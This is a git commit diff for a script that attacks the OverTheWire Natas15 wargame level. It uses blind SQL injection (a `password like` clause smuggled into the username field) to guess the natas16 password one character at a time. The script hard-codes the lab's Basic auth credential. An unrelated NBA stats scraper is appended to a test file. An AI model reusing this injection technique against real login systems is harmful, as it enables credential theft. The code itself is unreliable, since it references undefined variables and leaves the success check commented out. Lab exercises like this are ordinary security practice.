c600aa54287baa086a1f72173d3c7c5c82e089fd
staticbunny <matt.griffiths@gmail.com>
2016-11-01 03:24:57 +0000

    updated loop

--- Natas15_Request.py
+++ Natas15_Request.py
@@ -1,15 +1,20 @@
-import requests
-
+import requests,string
+password = ("wA")
+alphanum = string.ascii_letters + string.digits
 url = "http://natas15.natas.labs.overthewire.org/"
-
-querystring = {"debug":"yes","username":"natas16\" and password like \"w%"}
-
+#
+querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
+length = len(password)
 headers = {
     'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
     'cache-control': "no-cache",
     'postman-token': "a485c7b5-2c71-52cf-fa16-62c92545ecf4"
     }
+for attempt in alphanum: 
+     querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
+     response = requests.request("GET", url, headers=headers, params=querystring)
+     print(response.text)
+  
+# if "This user exists." in response:
+#  string.append(password)
 
-response = requests.request("GET", url, headers=headers, params=querystring)
-
-print(response.text)
--- Tests.py
+++ Tests.py
@@ -4,3 +4,21 @@ alphanum = string.ascii_letters + string.digits
 print (alphanum)
 for i in alphanum:
     print(i)
+import requests
+import json
+
+
+
+def get_data(url):
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        return data
+    else:
+        print(response.text)
+        print(response.status_code)
+
+for i in range(30): # 30 NBA Teams
+    base_url = "http://stats.nba.com/stats/teamdetails?teamID="   
+    team_url = base_url + str(team_id)
+    data = get_data(team_url)
